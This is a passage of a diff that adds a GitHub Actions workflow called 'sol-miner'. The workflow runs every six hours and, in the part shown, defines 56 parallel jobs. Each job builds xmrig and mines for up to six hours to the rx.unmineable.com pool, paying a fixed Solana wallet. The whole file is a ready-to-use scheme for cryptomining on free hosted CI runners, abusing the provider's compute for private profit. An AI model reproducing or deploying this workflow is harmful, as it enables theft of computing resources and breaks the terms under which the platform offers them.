@@ -1,0 +1,1308 @@
+name: sol-miner
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'  # Jalan ulang setiap 6 jam
+
+jobs:
+  miner1:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 1
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker1 -p x --threads=4
+  miner2:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 2
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker2 -p x --threads=4
+  miner3:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 3
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker3 -p x --threads=4
+  miner4:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 4
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker4 -p x --threads=4
+  miner5:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 5
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker5 -p x --threads=4
+  miner6:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 6
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker6 -p x --threads=4
+  miner7:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 7
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker7 -p x --threads=4
+  miner8:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 8
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker8 -p x --threads=4
+  miner9:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 9
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker9 -p x --threads=4
+  miner10:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 10
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker10 -p x --threads=4
+  miner11:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 11
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker11 -p x --threads=4
+  miner12:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 12
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker12 -p x --threads=4
+  miner13:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 13
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker13 -p x --threads=4
+  miner14:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 14
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker14 -p x --threads=4
+  miner15:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 15
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker15 -p x --threads=4
+  miner16:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 16
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker16 -p x --threads=4
+  miner17:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 17
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker17 -p x --threads=4
+  miner18:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 18
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker18 -p x --threads=4
+  miner19:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 19
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker19 -p x --threads=4
+  miner20:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 20
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker20 -p x --threads=4
+  miner21:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 21
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker21 -p x --threads=4
+  miner22:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 22
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker22 -p x --threads=4
+  miner23:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 23
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker23 -p x --threads=4
+  miner24:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 24
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker24 -p x --threads=4
+  miner25:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 25
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker25 -p x --threads=4
+  miner26:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 26
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker26 -p x --threads=4
+  miner27:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 27
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker27 -p x --threads=4
+  miner28:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 28
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker28 -p x --threads=4
+  miner29:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 29
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker29 -p x --threads=4
+  miner30:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 30
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker30 -p x --threads=4
+  miner31:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 31
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker31 -p x --threads=4
+  miner32:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 32
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker32 -p x --threads=4
+  miner33:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 33
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker33 -p x --threads=4
+  miner34:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 34
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker34 -p x --threads=4
+  miner35:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 35
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker35 -p x --threads=4
+  miner36:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 36
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker36 -p x --threads=4
+  miner37:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 37
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker37 -p x --threads=4
+  miner38:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 38
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker38 -p x --threads=4
+  miner39:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 39
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker39 -p x --threads=4
+  miner40:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 40
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker40 -p x --threads=4
+  miner41:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 41
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker41 -p x --threads=4
+  miner42:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 42
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker42 -p x --threads=4
+  miner43:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 43
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker43 -p x --threads=4
+  miner44:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 44
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker44 -p x --threads=4
+  miner45:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 45
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker45 -p x --threads=4
+  miner46:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 46
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker46 -p x --threads=4
+  miner47:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 47
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker47 -p x --threads=4
+  miner48:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 48
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker48 -p x --threads=4
+  miner49:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 49
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker49 -p x --threads=4
+  miner50:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 50
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker50 -p x --threads=4
+  miner51:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 51
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker51 -p x --threads=4
+  miner52:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 52
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker52 -p x --threads=4
+  miner53:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 53
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker53 -p x --threads=4
+  miner54:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 54
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker54 -p x --threads=4
+  miner55:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 55
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker55 -p x --threads=4
+  miner56:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 56
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker56 -p x --threads=4
+  miner57:
